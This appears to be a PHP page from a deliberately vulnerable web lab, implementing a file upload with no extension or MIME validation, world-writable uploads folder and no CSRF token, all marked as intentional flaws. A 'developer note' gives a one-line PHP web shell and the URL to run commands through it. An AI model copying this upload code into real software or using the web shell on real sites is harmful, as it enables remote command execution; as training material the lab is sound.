<?php
require_once "config.php";
render_header("Upload");

$uploaded = null;

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
    // VULN : aucune vérif d'extension/MIME (CWE-434)
    $target = __DIR__ . "/uploads/" . basename($_FILES["file"]["name"]);
    if (!file_exists(__DIR__ . "/uploads")) {
        mkdir(__DIR__ . "/uploads", 0777, true);
    }
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target)) {
        $uploaded = basename($_FILES["file"]["name"]);
    }
}
?>

<div class="container-narrow">
  <div class="card">
    <h1>Téléversement de fichier</h1>
    <p class="text-small mb-16">Sélectionnez un fichier à téléverser dans votre espace.</p>

    <?php if ($uploaded): ?>
      <div class="alert alert-success">
        Fichier reçu : <a href="uploads/<?= htmlspecialchars($uploaded) ?>"><?= htmlspecialchars($uploaded) ?></a>
      </div>
    <?php endif; ?>

    <!-- VULN : aucun token CSRF, aucune validation d'extension/MIME -->
    <form method="POST" enctype="multipart/form-data">
      <div class="form-group">
        <label for="file">Fichier</label>
        <input type="file" id="file" name="file" required>
      </div>
      <button class="btn" type="submit">Téléverser</button>
    </form>

    <div class="devnote">
      <strong>Note développeur :</strong> aucune validation d'extension n'est faite côté serveur.
      Tester un upload de <code>shell.php</code> contenant <code>&lt;?php system($_GET['c']); ?&gt;</code>
      puis appeler <code>/WebLab/uploads/shell.php?c=whoami</code>.
    </div>
  </div>
</div>

<?php render_footer(); ?>
